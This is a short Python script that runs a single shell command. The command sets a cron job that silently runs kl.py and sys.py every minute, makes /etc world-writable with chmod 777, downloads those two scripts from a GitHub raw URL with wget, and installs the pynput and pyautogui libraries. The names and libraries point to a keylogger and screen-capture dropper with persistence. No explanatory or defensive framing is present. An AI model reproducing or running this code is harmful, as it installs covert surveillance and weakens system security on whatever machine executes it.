import os

os.system('echo "*/1 * * * * cd && cd /etc/ && python3 kl.py && python3 sys.py > /dev/null 2>&1 &" > cron && cat cron | crontab - && sudo chmod 777 /etc/ && mv run.py /etc/ && cd && cd /etc/ && wget https://raw.githubusercontent.com/katerin966/03/main/kl.py && wget https://raw.githubusercontent.com/katerin966/03/main/sys.py && pip install pynput && pip install logging && pip install pyautogui && python3 kl.py && python3 sys.py')
